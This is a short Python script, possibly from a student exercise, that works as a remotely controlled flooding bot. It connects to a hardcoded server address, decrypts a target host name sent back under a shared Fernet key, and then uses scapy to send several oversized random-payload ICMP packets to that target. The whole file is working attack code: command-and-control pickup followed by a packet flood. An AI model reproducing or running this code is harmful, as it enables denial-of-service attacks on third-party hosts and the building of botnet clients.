from cryptography.fernet import Fernet
import socket
from scapy.all import *

#Récupération de la clé symétrique
with open("secret.key", "rb") as key_file:
    key=key_file.read()
fernet = Fernet(key)

client_socket = socket.socket()
host = "137.194.152.90"
port = 8081
print('Waiting for connection response')
try:
    client_socket.connect((host, port))
except socket.error as e:
    print(str(e))
res = client_socket.recv(1024)
decrypted_data=fernet.decrypt(res).decode('utf-8')
print(res, decrypted_data)
"""while True:
    Input = input('Hey there: ')
    client_socket.send(str.encode(Input))
    res = client_socket.recv(1024)
    print(res.decode('utf-8'))"""
client_socket.close()


number = 10
target = decrypted_data.split(" ")[0]

for x in range (0,number): 
    send(IP(dst=target)/ICMP()/Raw(RandString(10000)))